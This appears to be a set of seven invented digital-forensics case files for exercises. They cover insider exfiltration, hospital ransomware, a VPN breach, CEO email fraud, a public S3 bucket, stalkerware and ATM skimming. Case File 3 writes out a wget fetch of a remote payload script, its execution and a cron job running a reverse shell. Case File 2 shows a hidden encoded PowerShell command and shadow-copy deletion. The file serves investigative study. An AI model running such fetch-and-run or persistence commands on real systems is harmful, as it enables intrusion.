@@ -1,0 +1,198 @@
+⭐ CASE FILE 1 — “Operation ShadowKey” (Insider Data Theft)
+
+Case ID: CF-2025-001
+Type: Insider Threat / Data Exfiltration
+Company: Norbitex Cloud Solutions
+Summary:
+A senior employee, suspected of copying confidential client databases, attempted to bypass data loss prevention tools using encrypted USB drives and VPN obfuscation.
+
+Evidence Extracts:
+
+Login anomalies from user r.malhotra at 02:13 AM
+
+USB device VID: 0781-PNY-2982 detected at 02:17 AM
+
+File access: /srv/clients/bank_audit_2024.csv (32 MB)
+
+Outbound IP flagged: 185.92.61.22 (Known exfiltration server)
+
+Encrypted ZIP files found: audit_data.zip, keys.enc
+
+Browser history indicates searches for “disable audit logs linux”
+
+Investigation Notes:
+Suspect attempted to delete system logs but hash mismatch revealed tampering.
+
+⭐ CASE FILE 2 — “Project DarkSignal” (Ransomware Incident)
+
+Case ID: CF-2025-002
+Type: Ransomware / Malware
+Organization: Vetra Hospitals Pvt Ltd
+Summary:
+Hospital internal servers were encrypted by a ransomware variant similar to MedusaLocker.
+
+Key Evidence:
+
+Initial infection vector: Malicious email attachment .docm
+
+User accounts.finance@vetrahosp.in
+ opened macro-enabled file
+
+Process execution: powershell -nop -w hidden -enc ...
+
+Encryption started at: 11:42:03 AM
+
+Files renamed with extension: .DARKSIGNAL
+
+Ransom note: RECOVER_FILES.txt
+
+Logs Extract:
+
+11:41:59 - User clicked external email attachment
+11:42:03 - Unknown process executed (PID 552)
+11:42:09 - Shadow copies deleted (vssadmin)
+11:42:14 - Mass file modification event detected
+11:42:45 - Outbound connection to 193.110.27.44
+
+
+Findings:
+Attack likely used a PowerShell-based loader. Evidence points to phishing.
+
+⭐ CASE FILE 3 — “GhostPort Intrusion” (Network Breach)
+
+Case ID: CF-2025-003
+Type: Unauthorized Access / Network Breach
+Company: AeroChip Manufacturing
+Summary:
+A cyber attacker exploited an outdated VPN module and gained limited shell access to a production server.
+
+Important Events:
+
+Brute force attempts across port 443
+
+Successful login using weak password: admin@1234
+
+Commands executed:
+
+wget http://ghostcc.xyz/payload.sh
+
+chmod +x payload.sh
+
+./payload.sh
+
+Lateral movement attempts via SSH blocked by firewall
+
+Suspicious cronjob created: */10 * * * * /tmp/ghost
+
+Forensic Artifacts:
+
+File /tmp/ghost contains base64 encoded reverse shell
+
+Syslog indicates privilege escalation attempts using sudo -l
+
+⭐ CASE FILE 4 — “PhantomLedger Scam” (Financial Fraud)
+
+Case ID: CF-2025-004
+Type: Email Fraud / Spoofing / Financial Crime
+Victim: GreenMatrix Trading Co.
+Summary:
+Fraudster impersonated the CEO and convinced accounts team to transfer ₹18,50,000 to a fraudulent account.
+
+Email Header Evidence:
+
+SPF: FAIL
+
+DKIM: None
+
+Received-SPF: softfail
+
+Actual sender IP: 102.45.19.221 (Nigeria)
+
+Display name spoofed: “CEO - Prakash Menon”
+
+Browser History Clue:
+Employee searched “how to check bank swift code” just before transaction.
+
+Findings:
+Classic business email compromise (BEC) attack.
+
+⭐ CASE FILE 5 — “BlueEcho Leak” (Cloud Storage Compromise)
+
+Case ID: CF-2025-005
+Type: Cloud Intrusion / Misconfiguration Abuse
+Company: Maplero Office Automation
+Summary:
+Sensitive engineering documents leaked publicly due to an improperly secured AWS S3 bucket.
+
+Key Evidence:
+
+S3 bucket maplero-confidential set to PUBLIC
+
+Public objects:
+
+/designs/prototypeA.pdf
+
+/contracts/contract_2025.pdf
+
+Access logs show downloads from:
+
+IP: 66.249.77.29 (Google bot)
+
+IP: 191.44.211.90 (unknown)
+
+IAM role misconfiguration allowed anonymous viewing
+
+No encryption-at-rest enabled
+
+Investigation Outcome:
+Leak occurred due to human error, not hacking.
+
+⭐ CASE FILE 6 — “Operation WireTrap” (Mobile Forensics)
+
+Case ID: CF-2025-006
+Type: Mobile Spyware Investigation
+Device: Android 12
+Summary:
+Phone suspected to be infected with stalkerware capturing camera and microphone activity.
+
+Artifacts:
+
+APK found: wiretrap_client.apk
+
+Permissions suspicious:
+
+RECORD_AUDIO
+
+READ_SMS
+
+ACCESS_FINE_LOCATION
+
+SYSTEM_ALERT_WINDOW
+
+Background service constantly sending data to:
+
+147.56.28.101/api/upload
+
+Battery drain pattern indicates hidden processes
+
+Timestamps show camera activation at unusual hours
+
+⭐ CASE FILE 7 — “EvoBank ATM Swap Attack” (Hardware + Cyber Hybrid Case)
+
+Case ID: CF-2025-007
+Type: ATM Card Skimming
+Summary:
+Attackers replaced an ATM’s card reader and installed a Bluetooth skimmer.
+
+Digital Evidence:
+
+Bluetooth MAC found broadcasting: 00:1A:7D:DA:71:13
+
+PIN pad firmware logs modified
+
+Suspicious access to ATM maintenance port
+
+Browser logs show criminals checking account balances from same IP block
+
+Forensic Insight:
+Hardware + software compromise.
